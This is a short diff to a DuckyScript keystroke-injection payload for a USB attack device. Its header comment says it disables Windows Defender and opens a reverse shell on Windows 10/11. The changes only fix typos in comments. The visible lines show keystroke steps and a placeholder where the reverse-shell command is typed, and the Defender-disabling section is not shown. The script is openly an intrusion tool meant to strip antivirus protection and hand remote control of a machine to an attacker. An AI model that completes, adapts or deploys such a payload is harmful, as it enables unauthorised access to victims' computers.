@@ -1,6 +1,6 @@
 REM Title:My Cool ducky code
 REM Author: Ray
-REM Description:Disable Windows Defender and opens an reverse shell
+REM Description: Disable Windows Defender and opens a reverse shell
 REM Target: Windows 11/10
 
 REM Auto Start payload instead of a 3000 delay
@@ -73,7 +73,7 @@ DELAY 1000
 ALT y
 DELAY 1000
 
-REM Enter reverse shell and hides the terrminal
+REM Enter reverse shell and hides the terminal
 STRINGLN <ReveShell payload>
 DELAY 200
 GUI DOWNARROW
